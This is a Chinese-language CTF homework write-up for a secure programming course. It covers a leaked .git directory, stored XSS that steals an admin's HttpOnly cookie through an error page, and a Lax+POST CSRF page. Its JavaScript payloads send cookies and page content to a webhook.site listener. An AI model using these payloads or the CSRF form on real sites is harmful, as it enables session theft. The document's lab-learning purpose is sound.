###### tags: `程式安全`
# Secure Programming HW4 Writeup
## The Stupid Content Tracker
### 解法：
題目中給了一個.git的連結，根據上課內容，可以利用工具把裡面檔案跟source code還原出來
使用課程給的工具GitHack撈出檔案，並進入admin_portal_non_production資料夾查看
![](https://i.imgur.com/i3xyfgx.png)
查看index.php得知只要進入這個網站就可以看到FLAG了
```php=
<?php

echo getenv("FLAG");

?>
```
但是網站被.htpasswd給擋住了
![](https://i.imgur.com/oe6XDVT.png)
爬了一下文，從下面的網站發現Git_Extract可以撈出更多東西
https://www.jianshu.com/p/0ea09975169d
成功撈出.htpsswd檔案
![](https://i.imgur.com/nENUZg7.png)
利用.htpasswd裡面的帳號密碼成功登入index.php並取得flag
![](https://i.imgur.com/tUpkgVu.png)
flag如下：
![](https://i.imgur.com/Nse29mW.png)
## Zero Note Revenge
### 解法：
這次admin的cookie被加上HttpOnly，沒辦法直接用document.cookie得到
沒什麼想法就照著Hint隨便access一個abc的Note，結果cookie竟然出現在Error message裡面(笑
![](https://i.imgur.com/7stX01r.png)
由於request包含的cookie會顯示在錯誤訊息裡面，我們只要得到admin噴的錯誤訊息就好
那現在的問題是要怎麼讓admin去瀏覽一個不存在的note abc的同時，又讓他把資訊送給我們監聽的網站
我想到的解法是用兩層的fetch完成這兩個操作

先來思考怎麼拿到Error message
一開始想到的是document.body，但是測試了半天突然想到document.body要在不存在的頁面才有用，重導向過去的同時，你給admin看的note後面的script也失效了
後來發現用GET不就會拿到網頁內容了，這個可以靠fetch做到
爬文爬了半天終於找到正確的用法如下面的code
這份code會把response的訊息印在console上，測試完其中的確包含Error message
```javascript=
fetch("http://edu-ctf.csie.org:30010/note/abc")
    .then(res => res.text())
    .then(console.log)
```
第二個fetch上課教過了，把Error message的內容經過btoa encode之後放在你監聽的網址的GET的參數部份，在request中就可以得到Error message
```javascript=
fetch('https://webhook.site/e290d08c-d18f-4060-abab-3c89c7c19c79/?' + btoa(Error_message)) 
```
那關鍵是怎麼把這兩個fetch串起來，從第一個fetch中的console.log沒放參數來看，第二個then可以順利取得上一個then的值，所以直接寫fetch就可以拿到值
但問題是我們還要塞自己的網址跟btoa的function，就沒法這樣寫
查了半天看到fetch的資料也可以寫function，於是就把res變成function的input parameter，然後塞進第二個fetch即可
最後的nested fetch如下：
```javascript=
fetch("http://edu-ctf.csie.org:30010/note/abc")
    .then(res => res.text())
    .then(function(data){
        fetch('https://webhook.site/e290d08c-d18f-4060-abab-3c89c7c19c79/?' + btoa(data)) 
    })
```
接下來把上面的javascript包進script tag當成note的內容上傳
```htmlembedded=
<script>
fetch("http://edu-ctf.csie.org:30010/note/abc")
    .then(res => res.text())
    .then(function(data){
        fetch('https://webhook.site/e290d08c-d18f-4060-abab-3c89c7c19c79/?' + btoa(data)) 
    })
</script>
```
先點進自己的note確定網站有收到request，然後再用Report to admin讓admin去看我們的note
查看收到的request
![](https://i.imgur.com/zwMAdwz.png)
接著做base64 decode取得原本的內容，就會發現叫做secret裡面有塞FLAG
![](https://i.imgur.com/NHG2w2K.png)

flag如下：
>FLAG{Oh_I_f0rg0t_To_disAble_The_deBug_PagE}
## Zero Meme
首先把題目給的文章看完，大致上的意思就是cookie預設是Lax，只能使用top-level的GET Method才能在跨域請求攜帶，而想設成None要加上Secure的標籤，變成httpOnly

接著瀏覽題目中的提示，看到Lax+POST這個名詞，上網爬文從以下網站看到相關描述
https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b
Lax+POST就是當cookie在兩分鐘內剛被刷新的時候，在top-level使用POST請求送出的cookie會視為None，也就是不受Lax的限制，可以完成CSRF

所以要做的事有兩件
1.刷新cookie
2.攜帶cookie送出POST請求完成CSRF並取得admin的cookie(題目有講flag在admin的cookie裡面）
第一件事題目已經幫忙做完了，admin每次點擊你傳的連結都會重新登入，讓cookie保持在兩分鐘內刷新過的狀態
那接下來需要研究這個網站有哪些POST的行為
首先是帳號密碼登入的界面，但是因為登入只會覆蓋掉cookie，對我們的CSRF沒有幫助
![](https://i.imgur.com/JqnrOLz.png)
另外兩種POST是登入後頁面的上傳Meme到你的頁面上跟上傳連結給admin，那我們先試試這兩種POST可以做到什麼事
![](https://i.imgur.com/nZqicyj.png)
首先測試上傳Meme的表單裡面可不可以塞入XSS的腳本
先使用下面的payload測試，成功塞入確定可以使用XSS
```javascript=
https://dog"> <script>alert(1)</script>
```
![](https://i.imgur.com/eKwX6wk.png)

那上傳給admin的連結也偷塞fetch看看會不會收到請求，很明顯並沒有，如果成功了跟Lab差在哪裡XD
```javascript=
https://dogs.jpg"> <script>fetch('https://webhook.site/e290d08c-d18f-4060-abab-3c89c7c19c79/?'+btoa(document.cookie))</script>
```
統整一下思路，想完成POST的CSRF應該上傳一個自己可以控制內容的網站連結給admin，網站裡面塞入包含偷cookie的XSS的POST請求，而admin點擊你的連結後，就會上傳XSS到admin的頁面偷走他的cookie
那為了有自己的domain，我去申請了Github student pack並使用name.com取得了johnhuang.codes這個domain name
之後在網站放入XSS的腳本，利用html的form來複製input跟題目網站一樣的表單，並在intro的input裡面放入LAB使用的fetch腳本，將cookie傳到自己監聽的網站
網站內容如下：
```htmlembedded=
<form style="display:none" name=csrf id="dog_form" method='post' 
      action="https://edu-ctf.csie.org:44303/me">
  <input type="text" name="intro" id="dog">

</form>

<script>
  var evil_value = "http://dog.com";
  evil_value += "\">".toString().replace(/^.+?\*|\\(?=\/)|\*.+?$/gi, "");   
  evil_value += "<script>fetch('https://webhook.site/e290d08c-d18f-4060-abab-3c89c7c19c79/?'+btoa(document.cookie))";
  evil_value += "<\/script>".toString().replace(/^.+?\*|\\(?=\/)|\*.+?$/gi, "");  
  document.getElementById("dog").value = evil_value;
  document.getElementById("dog_form").submit();
</script>
```
接著把網站網址上傳給admin，並到自己監聽的網站查看
![](https://i.imgur.com/jyJfKSF.png)

把cookie做base64 decode即可取得flag
![](https://i.imgur.com/AYVtx8m.png)

flag如下：
>FLAG{Will_samesite_cookies_by_default_puts_the_final_nail_in_the_CSRF_coffin?}






